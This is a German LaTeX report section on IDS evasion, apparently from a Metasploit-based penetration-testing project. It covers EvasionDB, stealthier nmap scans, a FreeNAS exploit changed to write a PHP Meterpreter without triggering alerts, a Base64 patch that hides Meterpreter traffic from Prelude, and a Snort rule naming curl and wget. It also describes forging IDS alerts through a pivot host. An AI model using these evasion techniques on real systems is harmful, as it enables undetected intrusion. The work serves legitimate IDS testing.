@@ -1,0 +1,293 @@
+\section{IDS-Evasion}
+\label{sec:evasion-db}
+\authors{\BK \and \JF}{\LM \and \DE \and \MW}
+
+\enquote{Evasion} bedeutet wörtlich übersetzt \textit{\enquote{das
+  Ausweichen}}. Im Kontext von \f ist damit gemeint,
+die Erkennung durchgeführter Angriffe durch \acr{ids} zu erschweren
+oder die Angriffe womöglich sogar ganz zu verbergen.
+
+\acr{msf} bringt eine große Bandbreite an Optionen zum Thema Evasion
+mit. Für jeden \glos{exploit} gibt es die Möglichkeit, dessen Ausführung
+durch Setzen bestimmter Evasion-Optionen (\texttt{show evasion}) zu
+verändern, um diesen so vor der Erkennung durch ein \acr{ids} zu
+bewahren und somit nach Möglichkeit keine \glspl{glos:idmef-event} zu
+erzeugen.
+
+Mit der entwickelten \textit{EvasionDB} besteht die Möglichkeit, die
+Auswirkungen dieser Evasion-Optionen auf die Erkennung durch ein
+\acr{ids} zu testen. Dabei werden nach jedem ausgeführten \glos{exploit} die
+durch das \acr{ids} erzeugten \glspl{glos:idmef-event} ermittelt und
+dem Angriff zugeordnet. So lässt sich durch systematische Anwendung
+der Optionen im Idealfall die Menge der erzeugten
+\glspl{glos:idmef-event} auf Null reduzieren. Ist dies der Fall,
+erhält man einen Anhaltspunkt, dass das eingesetzte \acr{ids} nicht
+ausreichend gut konfiguriert ist, um den ausgeführten \glos{exploit} zu
+erkennen.
+
+Um die EvasionDB einfach in \f oder ähnliche Systeme einbinden zu
+können, wurde sie als Ruby-Gem \textit{fidius-evasiondb} entwickelt und
+ist über Rubygems installierbar.
+
+\subsection{EvasionDB}
+\label{sec:idsevasion:evasiondb}
+
+\subsubsection{Hintergrund}
+
+Die EvasionDB wurde entwickelt, um Wissen über \glospl{exploit} und durch sie
+erzeugte \acr{idmef}-Events vorzuhalten. Angriffe, die auf ein
+Rechnernetz durchgeführt werden, erkennt ein installiertes \acr{ids}
+und speichert sie als \textit{Alert} im \acr{idmef}. Die meisten
+\acr{ids} basieren auf einem String-Matcher. Pakete, die einen
+verdächtigen Inhalt (\glos{payload}) enthalten, erzeugen ein oder mehrere
+\glspl{glos:idmef-event}. Um unterschiedliche \acr{ids} miteinander
+vergleichen und die durchgeführten Angriffe bewerten zu können, ist es
+nötig, Angriffe (\glospl{exploit}) mit \textit{Alerts} (\acr{idmef}-Events) in
+Beziehung zu setzen. Hier kommt die EvasionDB ins Spiel. Es handelt
+sich um einen dynamischen Ansatz, bei dem alle durchgeführten \glospl{exploit}
+überwacht werden und im Anschluss die erzeugten
+\glspl{glos:idmef-event} bei einem \acr{ids} abgefragt und durch die
+EvasionDB gespeichert werden. Somit werden die \glspl{glos:idmef-event}
+mit den \glospl{exploit} in Verbindung gesetzt.
+
+Wie bereits in der Einleitung erwähnt, bietet \acr{msf} bereits
+Evasion-Optionen, die speziell dafür gedacht sind, den Angriff so zu
+verändern, dass er von einem \acr{ids} nicht mehr erkannt wird. Da
+letztlich die Konfiguration bzw. der installierte Regelsatz im
+\acr{ids} dafür verantwortlich ist, auf welchen \glos{payload} reagiert wird,
+haben wir uns für den dynamischen Ansatz entschieden. Der Angriff wird
+in seiner Standardkonfiguration durchgeführt und mit den Events
+verglichen, die der Angriff erzeugt hat. Ein schrittweises Verändern
+der Exploit-Optionenkann dafür sorgen, dass weniger oder gar keine
+Events mehr erzeugt werden.
+
+Eine einmal erzeugte EvasionDB kann als Wissensbasis die Grundlage für
+weitere Entscheidungen und Bewertungen liefern. \glospl{exploit} können anhand
+ihrer \textit{Loudness} bewertet werden. \textit{Loudness} bezeichnet in diesem
+Kontext die Anzahl und Güte der durch den jeweiligen Exploit bei einem
+\acr{ids} erzeugten \glspl{glos:idmef-event}. Alternativ kann über das
+gezielte Erzeugen von False-Positives versucht werden, bei einem \acr{ids}
+\glspl{glos:idmef-event} zu reproduzieren.
+
+\subsubsection{Implementierung}
+
+Die EvasionDB lässt sich auf zwei Arten verwenden. Es können
+ausgeführte Angriffe mit einem \acr{msf}-Plugin überwacht werden und
+erzeugte \glspl{glos:idmef-event} zum Aufbauen einer Wissensbasis
+gespeichert werden. Zusätzlich bietet die EvasionDB einige
+Hilfsfunktionen, um eine bestehende Wissensbasis abzufragen. Es könnte
+beispielsweise der \glos{exploit} herausgesucht werden, der die wenigsten
+\glspl{glos:idmef-event} erzeugt. An dieser Stelle sei allerdings
+hervorgehoben, dass eine Wissensbasis nicht allgemein gültig
+ist. Welche \glspl{glos:idmef-event} schließlich erzeugt werden hängt
+immer von der Konfiguration und den Regeln eines \acr{ids} ab und eine
+Wissensbasis wird stets nur für ein \acr{ids} erzeugt. Es ist also
+nicht sicher, dass ein \glos{exploit}, der laut EvasionDB drei Events
+erzeugt, bei einem anders konfigurierten \acr{ids}, die gleichen
+Events auslöst. Zusätzlich hängt die Generierung der Events nicht nur
+vom verwendeten Regelsatz, sondern auch vom eingesetzten \acr{ids}
+ab. Da es bisher keine geeignete Wissensdatenbank gibt, kann die
+EvasionDB als Richtlinie und zur Abschätzung gut verwendet
+werden.
+
+Die gesammelten Informationen werden in zwei Datenbanken abgelegt. Die
+erste ist die Wissensbasis, die sämtliches Wissen über ausgeführte
+\glospl{exploit} und deren \glspl{glos:idmef-event} enthält. Die zweite
+Datenbank ist die vom \gls{glos:prelude-ids}. Diese Datenbank wird nur
+benötigt, wenn Wissen erzeugt werden soll. Um feststellen zu können,
+welche Events durch einen Angriff erzeugt wurden, verbindet sich die
+EvasionDB direkt mit der angegebenen Datenbank des
+\gls{glos:prelude-ids} und fragt die \glspl{glos:idmef-event} ab, die im
+Zeitfenster des Angriffs erstellt wurden.
+
+Die Implementierung der EvasionDB umfasst die beiden Komponenten
+\textit{Fetcher} und \textit{Recorder}, um nicht von \acr{msf} und
+\gls{glos:prelude-ids} als \acr{ids} abhängig zu sein. Ein Fetcher ist
+dafür zuständig, von einem \acr{ids} die erzeugten Events
+abzuholen. Die Implementierung für das \f-System bringt einen
+Fetcher für \gls{glos:prelude-ids} mit, der direkt auf dessen
+Datenbank zugreift. Recorder sind dazu gedacht, die Angriffe und deren
+Pakete zu protokollieren. Die EvasionDB kommt mit einem Recorder und
+einem Plugin für \acr{msf}, allerdings ist die EvasionDB so gestaltet,
+dass auch Erweiterungen für andere Software zum Penetration-Testing
+eingebunden werden können.
+
+Die Wissensbasis der EvasionDB muss mit Hilfe eines \acr{msf}-Plugins
+befüllt werden. In der \acr{msf}-Konsole muss das Plugin geladen
+werden (\texttt{load evasiondb}). Das Plugin sorgt dafür, dass alle
+Exploits und Auxiliaries (Module), die fortan ausgeführt werden,
+protokolliert werden. Nachdem ein Modul beendet ist, werden sowohl die
+gesendeten Pakete als auch die generierten \glospl{idmef-event} in der
+Wissensdatenbank gespeichert. Die Events lassen sich über den Befehl
+\texttt{show\_events} anzeigen. Das Listing~\ref{evasion-db-sample} gibt einen Eindruck
+über die Verwendung des Plugins in \acr{msf}.
+
+Um \glospl{exploit} mit unterschiedlichen Optionen testen zu können, bietet
+die EvasionDB an, Konfigurationsoptionen von bereits in der
+Wissensbasis vorhandenen Szenarien zu laden. Somit kann untersucht werden, ob sich durch
+unterschiedliche Konfigurationen eines \glos{exploit}s die \textit{Loudness}
+verändert.
+
+\subsection{Ergebnisse}
+
+Im Folgenden werden die Ergebnisse beschrieben, die während der Untersuchung
+zum Thema Evasion erzielt wurden. Mit Hilfe der EvasionDB wurden sowohl \glospl{exploit},
+als auch Scan-Operationen daraufhin untersucht, welche \acr{idmef}-Events sie erzeugen.
+Durch bestimmte Argumente, die bei der Ausführung von \acr{nmap} verwendet werden, kann die Anzahl
+der Events reduziert werden. Durch eine Modifikation des
+\glos{exploit} (\texttt{multi/http/freenas\_exec\_raw}) ist es möglich, die Anzahl
+erzeugter Events auf Null zu reduzieren.
+
+\subsubsection{NMap}
+
+Die Anzahl geworfener Events lässt sich nahezu auf Null reduzieren, wenn
+zum einen nur ausgewählte(interessante) Ports gescannt werden. Zum anderen
+sollte wenigstens die Option \texttt{-polite} verwendet werden. Stealth-Scans,
+wie \texttt{-sN} können zusätzliche Erfolge erzielen. Die Protokollierung der
+NMap-Tests ist in Abschnitt~\ref{nmap-evasion-tests} nachzulesen.
+
+\subsubsection{Freenas-Exploit}
+
+Bei dem \glos{exploit} \texttt{multi/http/freenas\_exec\_raw} ist es gelungen,
+diesen auszuführen, ohne dass Prelude ein einziges Event
+registriert. Der Exploit nutzt eine Schwachstelle in
+FreeNAS\footnote{The FreeNAS Project: \url{http://www.freenas.org/}}
+0.7.2. Das Skript \texttt{exec\_raw.php} nimmt einen beliebigen Shell-Befehl
+und führt ihn auf dem Host aus. Der \glos{exploit} nutzt diese Schwachstelle
+aus, um einen PHP-Meterpreter zunächst via \enquote{\texttt{echo}} in eine Datei zu
+schreiben und anschließend aufzurufen. In seiner Standardkonfiguration
+erzeugt der Exploit ein Event mit der Meldung \enquote{\texttt{ET WEB\_SERVER Exploit
+Suspected PHP Injection Attack (cmd=)}}. Dafür verantwortlich ist eine Regel, wie
+sie in Listing~\ref{etpolicy} zu sehen ist.
+
+\begin{lstlisting}[language={},caption={ET-Policy-Regel (formatiert)},label=etpolicy]
+  alert http $EXTERNAL_NET any -> $HTTP_SERVERS any (
+    msg:"ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)";
+    flow:to_server,established;
+    content:"GET ";
+    http_method;
+    content:".php?";
+    nocase;
+    http_uri;
+    content:"cmd=";
+    http_uri;
+    nocase;
+    pcre:"/cmd=.*(cd|\;|echo|cat|perl|curl|wget|id|uname|t?ftp)/Ui";
+    classtype:web-application-attack; reference:cve,2002-0953;
+    reference:url,doc.emergingthreats.net/2010920;
+    reference:url,www.emergingthreats.net/cgi-bin/cvsweb.cgi/sigs/WEB_SERVER/WEB_PHP_Injection;
+    sid:2010920; rev:4;
+  )
+\end{lstlisting}
+
+In der Regel sieht man, dass das Auftauchen von \texttt{echo} in einem
+Parameter namens \texttt{cmd} ein Event erzeugt. Hier wird der anfällige
+Ansatz von String-Matchern deutlich. Das Event lässt sich tatsächlich
+umgehen, wenn man es schafft, auf den Befehl echo zu verzichten und
+trotzdem den Inhalt des PHP-Meterpreters ins Verzeichnis des
+Webservers zu schreiben. Ein funktionierender Ansatz (hier nur die
+Generierung des \texttt{echo}-Befehls):
+
+\begin{lstlisting}
+  sploit = "grep -I -o -i -h 'e' * | head -1 | tr -d '\n'     >  evade.sh"
+  sploit = "grep -I -o -i -h 'c' * | head -1 | tr -d  '\n'    >> evade.sh"
+  sploit = "grep -I -o -i -h 'h' * | head -1 | tr -d '\n'     >> evade.sh"
+  sploit = "grep -I -o -i -h 'o' * | head  -1 | tr -d '\n'    >> evade.sh"
+  sploit = "grep -I -o -i -h ' ' * | head -1 | tr -d '\n'     >> evade.sh"
+  sploit = "grep -I -o -i -h '\\\$' * | head -1 | tr -d '\n'  >> evade.sh"
+  sploit = "sh evade.sh \"<?php\n#{shellcode}\n?>\" > #{page}"
+\end{lstlisting}
+
+Die Idee ist, ein Shell-Skript mit dem Inhalt \texttt{echo \$1} zu
+erzeugen. Gelingt dies, lässt sich statt \texttt{echo} das Skript benutzen, um
+beliebigen Inhalt in eine Datei zu schreiben. Der Weg dieses Skript zu
+erzeugen mag sicher nicht der Eleganteste sein, aber es funktioniert
+und Prelude wirft nach erfolgreichem \glos{exploit} tatsächlich kein Event
+mehr, welches auf den Einbruch hindeutet.
+
+Es ist allerdings aufgefallen, dass Prelude den PHP-Meterpreter
+ziemlich gut kennt. Es bringt also nichts, den Exploit lautlos
+ausführen zu können und dann mit einem PHP-Meterpreter den größten
+anzunehmenden Lärm zu verursachen. Ein Großteil der
+\acr{metap}-Befehle erzeugt \glspl{glos:idmef-event} beim
+\gls{glos:prelude-ids}.
+
+{\ttfamily
+\begin{longtable}{ll}
+  getuid & ET ATTACK\_RESPONSE Metasploit Getuid Command Detected\\
+  sysinfo & ET ATTACK\_RESPONSE Metasploit Sysinfo Command Detected\\
+  pwd & ET ATTACK\_RESPONSE Metasploit Print Working Directory Command Detected\\
+  ps & ET ATTACK\_RESPONSE Metasploit Process List (ps) Command Detected\\
+  ls & ET ATTACK\_RESPONSE Metasploit List (ls) Command Detected\\
+  getpid & ET ATTACK\_RESPONSE Metasploit File/Memory Interaction Detected\\
+  ipconfig & ET ATTACK\_RESPONSE Metasploit ipconfig Command Detected\\
+  route & ET ATTACK\_RESPONSE Metasploit Route Command Detected
+\end{longtable}}
+
+Das Problem ist, dass die Kommunikation des PHP-Meterpreters im
+Klartext stattfindet. Es gibt bisher keine verschlüsselte Variante
+\zB über HTTPS \cite{php-meterpreter-ssl}.
+
+Um auch den PHP-Meterpreter zu verstecken muss nur dafür gesorgt
+werden, dass Aufrufe, wie \texttt{stdapi\_""sys\_""config\_""sysinfo} nicht im
+Klartext über die Leitung geht. Die erste und einfachste Wahl ist hier
+Base64. Der Packetdispatcher von Rex
+\texttt{Rex::Post::Meterpreter::PacketDispatcher}, muss so erweitert werden,
+dass er laute Aufrufe vorher durch den Base64-Encoder schick.
+
+\begin{lstlisting}
+  def send_request(packet, t = self.response_timeout)
+    packet.tlvs.each do |tlv|
+      if ["stdapi_fs_ls","stdapi_sys_config_sysinfo","stdapi_fs_getwd","stdapi_sys_config_getuid"].member?(tlv.value)
+        tlv.value = Base64.encode64(tlv.value).to_s.gsub("\n","")
+      end
+    end
+    original_send_request(packet,t)
+  end
+\end{lstlisting}
+
+Die Gegenstelle auf dem kompromittierten Host muss den kodierten
+String wieder dekodieren, gucken ob es sich um eine Funktion handelt
+und diese aufrufen. Der Quelltext des PHP-Meterpreters liegt in
+\texttt{data/meterpreter/meterpreter.php} Die interessante Funktion ist hier
+\texttt{create\_response(\$req)}:
+
+\begin{lstlisting}[language=PHP]
+  if(is_callable(base64_decode($method_tlv['value']))){
+    $my_call = base64_decode($method_tlv['value']);
+    $result = $my_call($req, $pkt);
+  }elseif (is_callable($method_tlv['value'])) {
+    $result = $method_tlv['value']($req, $pkt);
+  }else{
+    my_print("Got a request for something I don't know how to handle (". $method_tlv['value'] ."), returning failure");
+    $result = ERROR_FAILURE;
+  }
+\end{lstlisting}
+
+Das Ganze ist eigentlich unspektakulär, sorgt aber dafür, dass kein
+einziges Event von Prelude mehr geworfen wird.
+
+\subsubsection{False-Positives}
+\label{false-positives}
+
+Im Kontext der EvasionDB wurden Methoden entwickelt, um
+\glospl{false-positive} zu erzeugen.
+Es sind einige \acr{msf}-Module entstanden, die
+spezielle Pakete schicken, um ein gewünschtes \acr{idmef}-Event zu erzeugen.
+Diese Vorgehensweise lässt sich zum Testen von \acr{ids} verwenden.
+
+\texttt{auxiliary/ids/false\_positive/netbios\_share\_access} ist ein
+Auxiliary, welches den \glos{payload} schickt, um das Event zu erzeugen. Wie
+man in Abschnitt~\ref{generate-false-positive} sehen kann, ist das Event von der
+Angreifer-IP 10.0.0.101 erzeugt worden. Das eigentlich Interessante daran ist,
+dass sich dies auch über einen \gls{glos:pivot-host}
+durchführen lässt, wie man im Beispiel~\ref{false-positive-pivot} sehen kann.
+
+Es wurde dort zwar ein Event erzeugt,
+allerdings wurde als Quelle der Pivot-Host 10.20.20.70 registriert,
+wodurch der eigentlich Verantwortliche nicht mehr ohne weiteres zu
+identifizieren ist.
+
+Dieses und weitere False-Positive-Auxiliaries werden z.B. für die
+\acr{ids}-Autokonfiguration (Abschnitt~\ref{ids-autoconfig}) verwendet.
+
